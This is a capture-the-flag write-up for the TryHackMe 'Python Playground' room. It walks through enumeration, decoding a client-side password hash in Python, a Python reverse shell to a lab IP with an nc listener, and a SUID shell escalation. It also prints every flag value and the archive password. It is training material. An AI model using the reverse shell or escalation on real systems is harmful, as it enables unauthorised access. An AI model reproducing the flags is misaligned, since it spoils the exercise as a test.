
# 🐍 Python Playground - TryHackMe

> Be creative!  
> 🔗 [Python Playground Room](https://tryhackme.com/room/pythonplayground)

---

## 🧠 Topics

- ✅ Network Enumeration  
- ✅ Web Enumeration  
- ✅ Web Poking  
- ✅ Python Scripting (Decoder)  
- ✅ Misconfigured Binaries  

---

## 🗂️ Appendix Archive

> **Password:** `1 kn0w 1 5h0uldn'7!`

---

## 🎯 Task 1: Hack it!

> *Jump in and grab those flags! All in the usual places: `/home/someuser`, `/root`*

<details>
<summary>🔍 Nmap Results</summary>

```bash
sudo nmap -A -sS -sC -sV -O 10.10.192.182
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Node.js Express framework
OS: Linux 4.15
```

🔗 [http://10.10.192.182](http://10.10.192.182)  
🔗 [http://10.10.192.182/login.html](http://10.10.192.182/login.html)  
🔗 [http://10.10.192.182/signup.html](http://10.10.192.182/signup.html)

</details>

---

<details>
<summary>📁 Gobuster Enumeration</summary>

```bash
gobuster dir -u http://10.10.251.33 -w /usr/share/dirb/wordlists/common.txt -x html
```

**Results:**

- `/admin.html` ✅  
- `/index.html`  
- `/login.html`  
- `/signup.html`  

🔗 [http://10.10.251.33/admin.html](http://10.10.251.33/admin.html)  
🔗 [View Source](view-source:http://10.10.251.33/admin.html)

</details>

---

<details>
<summary>🔐 JavaScript Login Bypass Logic</summary>

```js
const hash = int_array_to_text(
  string_to_int_array(
    int_array_to_text(string_to_int_array(password))
  )
);

if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu")
  window.location = "super-secret-admin-testing-panel.html";
```

🔗 [http://10.10.251.33/super-secret-admin-testing-panel.html](http://10.10.251.33/super-secret-admin-testing-panel.html)
</details>

---

<details>
<summary>🧮 Python Decoder Logic</summary>

```python
def text_to_unicode(string):
    return [str(ord(c)-97) for c in string]

def unicode_to_text(string):
    out = ''
    for i in range(0, len(string), 2):
        out += chr(int(string[i])*26 + int(string[i+1]))
    return out

hash = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
print(unicode_to_text(text_to_unicode(unicode_to_text(text_to_unicode(hash)))))
```

✅ Password: `spaghetti1245`

</details>

---

<details>
<summary>💻 Reverse Shell</summary>

```python
import socket, os, subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.106.222",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

```bash
# Listener
nc -lnvp 9001
```

</details>

---

<details>
<summary>📜 Flag Dump</summary>

### 🏁 Flag 1 (root):
```bash
cat /root/flag1.txt
```
`THM{7e0b5cf043975e3c104a458a8d4f6f2f}`

---

### 🏁 Flag 2 (connor):
```bash
cat /home/connor/flag2.txt
```
`THM{69a36d6f9da10d23ca0dbfdf6e691ec5}`

---

### 🏁 Flag 3 (via SUID shell):
```bash
/var/log/sh -p
cd /root
cat flag3.txt
```
`THM{be3adc69c25ad14eb79da4eb57925ad1}`

</details>

---

## ✅ Final Answers

1. **Flag 1**: `THM{7e0b5cf043975e3c104a458a8d4f6f2f}`  
2. **Flag 2**: `THM{69a36d6f9da10d23ca0dbfdf6e691ec5}`  
3. **Flag 3**: `THM{be3adc69c25ad14eb79da4eb57925ad1}`

---

## 🧠 Tips

- Use `<details>` and `<summary>` in `.md` to make content collapsible  
- Render this using **Markdown Preview Enhanced**, **Obsidian**, or static site generators for best effects  
- For interactivity, embed `copy.js`, `highlight.js`, or use GitHub Pages with custom JS
